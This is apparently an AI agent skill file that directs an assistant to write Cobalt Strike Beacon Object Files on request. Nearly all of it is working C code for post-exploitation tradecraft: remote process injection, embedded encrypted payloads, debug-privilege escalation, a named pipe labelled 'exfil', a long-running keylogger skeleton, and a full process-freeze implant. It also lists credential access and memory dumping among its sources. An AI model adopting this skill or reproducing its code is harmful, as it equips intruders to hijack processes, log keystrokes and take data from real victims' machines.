---
name: c-bof
description: "Generate, compile, and debug Beacon Object Files (BOF) in C for Cobalt Strike and compatible C2 frameworks. Use when the user asks to create a BOF, convert a C PoC into a BOF, resolve BOF linking/entrypoint errors, or needs patterns for DFR, heap management, injection, key-value state, multi-mode BOFs, or embedded payloads."
license: MIT
compatibility: "Requires x86_64-w64-mingw32-gcc (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires Cobalt Strike or a compatible loader (e.g. COFFLoader, RunOF)."
metadata:
  author: AeonDave
  version: "2.0"
  category: bof
  language: c
---

# C Beacon Object Files (BOF) Development

This skill produces production-quality BOFs in C following the official
[BOF Template](https://github.com/Cobalt-Strike/bof_template) conventions.
Patterns are derived from real-world BOFs covering process injection, credential
access, keylogging, memory dumping, and encrypted payload delivery.

## When to use

- User says *"create a BOF that…"* or *"write a BOF for…"*
- Converting an existing C PoC into a BOF
- Errors like `undefined reference to 'Beacon*'` or `.text section too large`
- Need patterns for DFR, heap management, injection, embedded payloads, multi-mode

---

## Step 1 — File header convention

Every BOF source file begins with a structured doc block:

```c
/**
 * @file       mybof.c
 * @brief      One-line description of the BOF.
 *
 * Technique:  Name of the technique / tradecraft
 * MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
 * Target:     x86_64 Windows 10/11, Server 2016+
 *
 * Architecture notes:
 *   Describe the approach, data flow, and any multi-mode logic.
 *
 * References:
 *   - https://relevant-url-or-paper
 */
```

---

## Step 2 — DFR declarations (grouped by module)

Group imports by DLL with aligned formatting. Declare every Win32 call used:

```c
/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ── ADVAPI32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

/* ── NTDLL ────────────────────────────────────────────── */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── MSVCRT ───────────────────────────────────────────── */
DECLSPEC_IMPORT int     __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
```

> Group order: KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → others.

---

## Step 3 — Heap management

**Never use `malloc`/`free`/`calloc`.** Use the process heap via DFR:

```c
HANDLE heap = KERNEL32$GetProcessHeap();
char* buf = (char*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, size);
if (!buf) {
    BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed");
    return;
}
/* ... use buf ... */
KERNEL32$HeapFree(heap, 0, buf);
```

For format buffers managed by Beacon, use `BeaconFormatAlloc`/`BeaconFormatFree`.

---

## Step 4 — Argument handling

Arguments are packed by CNA `bof_pack()` and parsed in exact order:

```c
datap parser;
BeaconDataParse(&parser, args, len);
int    mode  = BeaconDataInt(&parser);     /* i */
int    pid   = BeaconDataInt(&parser);     /* i */
char*  path  = BeaconDataExtract(&parser, NULL); /* z */
```

| Function | Returns | Pack char |
|----------|---------|-----------|
| `BeaconDataInt(&p)` | `int` | `i` |
| `BeaconDataShort(&p)` | `short` | `s` |
| `BeaconDataExtract(&p, &sz)` | `char*` | `z` / `Z` |
| `BeaconDataLength(&p)` | `int` | (length prefix) |

---

## Step 5 — Compilation

```bash
./scripts/build_bof.sh mybof.c
```

| Flag | Purpose |
|------|---------|
| `-m64 -c` | Target x64, compile only (no linking) |
| `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` section |
| `-fpack-struct=8` | Match Beacon struct packing |
| `-ffunction-sections -fdata-sections` | Allow section stripping |
| `-s` | Strip symbols |

---

## Advanced patterns

### Multi-mode BOF

A single BOF handles multiple operations via a mode integer:

```c
#define MODE_FREEZE   1
#define MODE_DUMP     2
#define MODE_UNFREEZE 3

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int mode = BeaconDataInt(&parser);

    switch (mode) {
        case MODE_FREEZE:   do_freeze(&parser);   break;
        case MODE_DUMP:     do_dump(&parser);      break;
        case MODE_UNFREEZE: do_unfreeze(&parser);  break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
    }
}
```

CNA dispatches modes: `bof_pack($1, "ii", 1, $pid)`.

### Key/Value Store — cross-invocation state (CS 4.9+)

Persist data between BOF calls within the same Beacon session:

```c
#define KEY_HANDLE "myBof_handle"
#define KEY_STATE  "myBof_state"

/* Store */
BeaconAddValue(KEY_HANDLE, (char*)hProc);

/* Retrieve */
HANDLE hProc = (HANDLE)BeaconGetValue(KEY_HANDLE);
if (!hProc) {
    BeaconPrintf(CALLBACK_ERROR, "No stored handle — run mode 1 first");
    return;
}

/* Cleanup */
KERNEL32$CloseHandle(hProc);
BeaconRemoveValue(KEY_HANDLE);
```

> Beacon does NOT free stored memory. The BOF must manage lifetimes.

### Ntdll dynamic resolution

When DFR won't work (e.g. undocumented Nt* functions), resolve at runtime:

```c
typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);

HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
fnNtSuspendProcess pNtSuspendProcess =
    (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");

if (!pNtSuspendProcess) {
    BeaconPrintf(CALLBACK_ERROR, "Failed to resolve NtSuspendProcess");
    return;
}
NTSTATUS status = pNtSuspendProcess(hProcess);
```

### Process injection pattern

```c
LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, payloadSize,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
if (!remoteBuf) { BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed"); goto cleanup; }

KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, payloadSize, NULL);

/* Flip to RX (never leave RWX) */
DWORD oldProt;
KERNEL32$VirtualProtectEx(hProc, remoteBuf, payloadSize, PAGE_EXECUTE_READ, &oldProt);

HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
```

### Embedded encrypted payload

Include encrypted blobs from a generated header:

```c
#include "payload.h"  /* enc_payload[], enc_key[], enc_nonce[], enc_payload_len */

static void secure_zero(void* ptr, size_t len) {
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    while (len--) *p++ = 0;
}

/* Decrypt in-place, then zero key material */
decrypt_chacha20(enc_payload, enc_payload_len, enc_key, enc_nonce);
/* ... use payload ... */
secure_zero(enc_key, sizeof(enc_key));
secure_zero(enc_nonce, sizeof(enc_nonce));
```

### Named pipe IPC

```c
wchar_t pipeName[128];
MSVCRT$_snwprintf(pipeName, 128, L"\\\\.\\pipe\\exfil_%d", targetPid);

HANDLE hPipe = KERNEL32$CreateNamedPipeW(pipeName,
    PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_WAIT,
    1, 0, BUFFER_SIZE, 0, NULL);

KERNEL32$ConnectNamedPipe(hPipe, NULL);
/* ReadFile loop → BeaconOutput */
```

### Error handling helpers

```c
static void PrintWin32Error(const char* context) {
    DWORD err = KERNEL32$GetLastError();
    BeaconPrintf(CALLBACK_ERROR, "%s failed (error %lu / 0x%lX)", context, err, err);
}

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
                                    &tp.Privileges[0].Luid);
    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    return ok;
}
```

### Custom struct definitions

When SDK headers are unavailable, define structs manually:

```c
#pragma pack(push, 1)
typedef struct _MY_SYSTEM_PROCESS_INFO {
    ULONG  NextEntryOffset;
    ULONG  NumberOfThreads;
    /* ... fields as needed ... */
    UNICODE_STRING ImageName;
    LONG   BasePriority;
    HANDLE UniqueProcessId;
} MY_SYSTEM_PROCESS_INFO, *PMY_SYSTEM_PROCESS_INFO;
#pragma pack(pop)
```

### Long-running BOF (message pump)

For BOFs that run indefinitely (keyloggers, monitors):

```c
static BOOL g_running = TRUE;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_DESTROY) { g_running = FALSE; return 0; }
    /* handle WM_INPUT, WM_CLIPBOARDUPDATE, etc. */
    return USER32$DefWindowProcW(hwnd, msg, wp, lp);
}

void go(char* args, int len) {
    (void)args; (void)len;  /* suppress unused param warnings */

    WNDCLASSW wc = {0};
    wc.lpfnWndProc   = WndProc;
    wc.lpszClassName  = L"BofWorker";
    wc.hInstance      = NULL;
    USER32$RegisterClassW(&wc);

    HWND hwnd = USER32$CreateWindowExW(0, L"BofWorker", NULL, 0,
        0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);

    MSG msg;
    while (g_running && USER32$GetMessageW(&msg, NULL, 0, 0) > 0) {
        USER32$TranslateMessage(&msg);
        USER32$DispatchMessageW(&msg);
    }
}
```

---

## Complete example — process_freeze.c

```c
/**
 * @file       process_freeze.c
 * @brief      Freeze/unfreeze a target process by PID.
 *
 * Technique:  Process suspension via NtSuspendProcess/NtResumeProcess
 * MITRE ATT&CK: T1489 (Service Stop) — adapted for process control
 * Target:     x86_64 Windows 10+
 */

#include <windows.h>
#include "beacon.h"

#define MODE_FREEZE   1
#define MODE_UNFREEZE 2

/* ── KERNEL32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);

/* ── ADVAPI32 ─────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);
typedef NTSTATUS (NTAPI *fnNtResumeProcess)(HANDLE);

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    KERNEL32$CloseHandle(hToken);
    return ok;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int mode = BeaconDataInt(&parser);
    int pid  = BeaconDataInt(&parser);

    EnableDebugPrivilege();

    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    fnNtSuspendProcess pSuspend = (fnNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");
    fnNtResumeProcess  pResume  = (fnNtResumeProcess)KERNEL32$GetProcAddress(hNtdll, "NtResumeProcess");

    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed", pid);
        return;
    }

    NTSTATUS status;
    if (mode == MODE_FREEZE) {
        status = pSuspend(hProc);
        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                     "[%s] PID %d — NTSTATUS 0x%08X",
                     status == 0 ? "FROZEN" : "FAIL", pid, status);
    } else if (mode == MODE_UNFREEZE) {
        status = pResume(hProc);
        BeaconPrintf(status == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                     "[%s] PID %d — NTSTATUS 0x%08X",
                     status == 0 ? "RESUMED" : "FAIL", pid, status);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown mode: %d", mode);
    }

    KERNEL32$CloseHandle(hProc);
}
```

---

## Support files

| File | Description |
|------|-------------|
| `scripts/bof_template.c`           | Production-quality BOF skeleton |
| `scripts/build_bof.sh`             | Compiler wrapper with optimized flags |
| `scripts/extract_arguments.py`     | Parse and pretty-print BOF argument packs |
| `references/REFERENCE.md`          | Full Beacon API reference (CS 4.12) and error table |
| `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
| `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs (LUID, NTSTATUS) |
